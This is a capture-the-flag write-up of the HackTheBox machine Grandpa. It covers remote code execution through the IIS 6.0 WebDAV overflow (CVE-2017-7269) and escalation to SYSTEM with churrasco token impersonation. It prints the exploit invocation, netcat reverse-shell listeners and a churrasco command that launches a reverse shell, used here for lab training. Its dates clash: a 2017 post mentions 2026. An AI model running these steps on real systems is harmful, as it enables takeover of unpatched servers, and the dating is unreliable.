---
layout: post
title: "A Web Server That Forgot to Grow Up"
subtitle: "HTB Grandpa, where a 2003-era web server runs your shell from a request header and then hands over the keys because it still trusts an old privilege"
date: 2017-11-28 12:00:00 +0000
description: "One open port, a fifteen-year-old web server, and a request header long enough to spill into kernel memory. Grandpa is a single CVE for the door and one stolen token for the crown."
image: /assets/og/a-web-server-that-forgot-to-grow-up.png
tags: [hackthebox, writeup]
---

Grandpa is exactly as old as the name promises. One port answers, port 80, and behind it sits IIS 6.0 running on Windows Server 2003, a stack so old it was already a museum piece when this box went live. You do not need a clever chain or a leaked secret. You send the server a single web request with one header stretched far past anything it was built to hold, and that header runs off the end of a buffer and straight into code execution. You land as a low account, notice the box still hands its service processes a powerful old privilege, and you borrow a passing system token to walk up to root. Two moves. The first is a fossil of a buffer overflow. The second is a fossil of a Windows design decision. The box is a tour of what happens when nobody ever made the software grow up.

```
        G R A N D P A
        =============
        port 80   →   IIS 6.0, server 2003, WebDAV on
                  |
        PROPFIND with an "If:" header a mile long
        runs off the end of the buffer
                  |
                  v
        shell as NETWORK SERVICE.
        it can pretend to be anyone, so it pretends to be SYSTEM.
                                            老
```

## 0x01 · one open door

`nmap` against Grandpa is the shortest scan you will run all month. A single port answers, and the version banner tells the whole story.

```
# nmap -sC -sV -p- 10.10.10.14
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods:
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
```

Read those two lines like a date stamp. IIS 6.0 shipped with Windows Server 2003. That product line went end of life years before this box was published, so a server still answering on it has not seen a patch in a very long time. And look at that method list. WebDAV is on, the feature that lets a web server act like a network drive you can write files to, and it advertises `PROPFIND`, `LOCK`, `PUT`, the whole verb set. WebDAV plus IIS 6.0 is not just an old version number. It is a specific, named, exploitable bug waving its hand.

## 0x02 · the header that ran off the end

The bug is CVE-2017-7269, and it lives in a function called `ScStoragePathFromUrl`. WebDAV requests can carry an `If:` header that points at a resource path. IIS 6.0 copies that path into a fixed buffer without ever checking how long it is. Hand it a path that is short, fine. Hand it a path that is enormous, and the copy keeps writing past the end of the buffer and into memory that holds the program's own instructions about what to do next. Overwrite the right spot and you choose where the server jumps. You point it at code you supplied.

Think of it like an old form with a box for your address that is exactly one line long. The clerk has been told to copy whatever you write into that box onto an index card, and they were never told the card has edges. You write an address two pages long. The clerk dutifully keeps writing off the bottom of the card, across the desk, and onto the instruction sheet that tells them what to do next, and now your words are the instructions. That overflow is the entire front door of Grandpa.

You do not have to hand-write the overflow. A public Python exploit for this CVE builds the malformed `PROPFIND` request for you, stuffs the shellcode into the `If:` header using an encoder that survives the path-copy, and fires it at port 80. You point it at the box and at your own listener.

```
# python iis_webdav_cve-2017-7269.py 10.10.10.14 80 10.10.14.4 443
[*] sending malformed PROPFIND with oversized If: header...
[*] payload delivered. check your listener.
```

Catch it and you are on the box.

```
# nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.4] from 10.10.10.14
C:\WINDOWS\system32\inetsrv> whoami
nt authority\network service
```

You arrive as `NT AUTHORITY\NETWORK SERVICE`, the stripped-down identity IIS hands its worker processes. It can read very little and write almost nowhere. The base of a wall, not the top of one. But hold on to one detail about that account, because Windows Server 2003 is about to be generous with it.

## 0x03 · a server too old to behave

First, confirm what you are standing on. `systeminfo` reads back a machine frozen in time.

```
C:\> systeminfo
OS Name:        Microsoft Windows Server 2003 ...
OS Version:     5.2.3790 Service Pack 2 Build 3790
```

Service Pack 2 and very few hotfixes. This host has been asleep for a decade. Now check the one thing that matters for a Windows privilege climb, the privilege list on your token.

```
C:\> whoami /priv
Privilege Name                  State
=============================== ========
SeImpersonatePrivilege          Enabled
SeAssignPrimaryTokenPrivilege   Enabled
```

`SeImpersonatePrivilege` is the whole game. It is a Windows feature, not a bug. Service accounts genuinely need to act on behalf of users who connect to them, so they are allowed to impersonate any token that gets handed to them. The flaw is not that the privilege exists. The flaw is what an attacker can do with it on a system this old. If you can convince a privileged process to hand you a token, you are allowed to wear it. And SYSTEM-level processes on Server 2003 can be tricked into handing one over.

Picture a hotel where the staff uniforms are kept on an open rack by the back door. The rule says any employee may put on any uniform they find, because sometimes the front desk has to cover for the kitchen. Reasonable enough, until someone notices that the manager's blazer, the one with the master key in the pocket, gets left on that rack between shifts. The rule never said you could not wear it. So you do, and now every locked door in the building opens for you.

## 0x04 · borrowing the manager's blazer

The tool that does the borrowing is `churrasco`, a Windows token-kidnapping utility built for exactly this Server 2003 weakness. It hunts through the threads of the privileged RPC service, finds one running with a SYSTEM token it can impersonate, snatches that token, and uses it to launch a program of your choosing as SYSTEM. Your `SeImpersonatePrivilege` is the permission slip that makes the whole theft legal in the eyes of the operating system.

You are `NETWORK SERVICE`, so you can write to a couple of scratch directories. Stage `churrasco` and a copy of netcat somewhere writable like `C:\wmpub\`, then tell churrasco to run your callback as SYSTEM. I sign the staged files `iceberg` so I know what I dropped.

```
C:\wmpub> .\churrasco-iceberg.exe -d "C:\wmpub\nc-iceberg.exe [ nc reverse shell to 10.10.14.4:443 ]"
```

The bracketed piece is just a second netcat reverse shell calling home, the same callback as before, except churrasco spawns it wearing the stolen SYSTEM token. Stand up a fresh listener and the new shell drops in as the most privileged account on the machine.

```
# nc -lvnp 443
connect to [10.10.14.4] from 10.10.10.14
C:\WINDOWS\system32> whoami
nt authority\system
```

From `NETWORK SERVICE` to `SYSTEM` with no exploit binary against the kernel, no memory corruption, nothing loud. Just a privilege the box was always going to grant and a tool that asked for it the right way. Both flags fall from there, user from Harry's desktop and root from the Administrator's.

```
C:\> type C:\Documents and Settings\Harry\Desktop\user.txt
████████████████████████████████
C:\> type C:\Documents and Settings\Administrator\Desktop\root.txt
████████████████████████████████
```

There is a faster road. Metasploit ships a module for CVE-2017-7269 and a token-impersonation payload that collapses both moves into a couple of commands, and on a box this old it works in about a minute. Doing it by hand is the version worth your time, because the hand version is the one that teaches you what the module is actually doing under the hood.

## 0x05 · the honest caveat

It is easy to file Grandpa under ancient history. The specific pieces really are dead. Nobody ships IIS 6.0 in 2026, and the token-kidnapping trick that churrasco uses was tightened up in the Windows versions that followed Server 2003. If that were the whole lesson, this box would be a nostalgia trip and nothing more.

But neither half of Grandpa is actually a fossil. The front door is a buffer overflow, and buffer overflows did not retire with Server 2003. They are the same disease that powers a long parade of modern memory-corruption bugs. Somewhere a program copies attacker input into a space without measuring whether it fits, and the input keeps writing until it reaches something it can steer. The language and the mitigations change. The mistake of not checking the length does not.

The privilege step is the one I would lose sleep over, because it is not a bug at all. `SeImpersonatePrivilege` ships green, working as designed, on machines far newer than this one. The entire family of potato exploits that haunt modern Windows service accounts is the same idea churrasco used here, a service identity that is allowed to impersonate, talked into impersonating something it should not. You cannot patch your way out of a feature. The defense is to stop running services as accounts that hold impersonation rights they never actually need, and to assume that any low service account on a Windows box is one careless token away from SYSTEM. The version number is the part that ages. The lever underneath it does not.

## 0x06 · outro

```
one port. one server too old to ever have been patched.
a header long enough to spill past the buffer and become the instructions.

then a privilege the machine was always going to honor,
and a uniform left on the rack with the master key still in the pocket.

measure the length. mind who gets to impersonate. wear black.

                                                            EOF
```

---

*HTB: Grandpa, retired 28 May 2020 (low confidence; that is the date of the retrospective write-up, and this 2003-era box almost certainly retired back in late 2017). An easy Windows box that is really a lecture on buffer overflows and impersonation privilege wearing a fifteen-year-old IIS costume. The overflow still fires in a lab and nowhere you don't own.*